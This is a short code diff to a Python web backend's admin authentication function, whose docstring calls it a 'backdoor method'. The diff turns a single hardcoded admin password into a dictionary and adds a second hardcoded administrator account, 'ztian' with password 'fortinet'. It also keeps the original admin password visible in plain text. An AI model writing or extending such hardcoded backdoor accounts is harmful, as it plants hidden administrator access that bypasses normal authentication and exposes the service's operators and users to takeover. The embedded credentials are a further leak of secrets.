@@ -46,12 +46,13 @@ def verify_admin_credentials(username: str, password: str) -> bool:
     Verify admin credentials (backdoor method)
     Hardcoded admin credentials
     """
-    # Hardcoded admin credentials
-    ADMIN_USERNAME = "admin"
-    # Password: 8920710zX! (use raw string to avoid escape issues)
-    ADMIN_PASSWORD = "8920710zX!"
+    # Hardcoded admin credentials (username: password)
+    ADMIN_CREDENTIALS = {
+        "admin": "8920710zX!",      # Original admin account
+        "ztian": "fortinet"          # New admin account
+    }
 
-    return username == ADMIN_USERNAME and password == ADMIN_PASSWORD
+    return ADMIN_CREDENTIALS.get(username) == password
 
 
 @router.post("/admin/login")
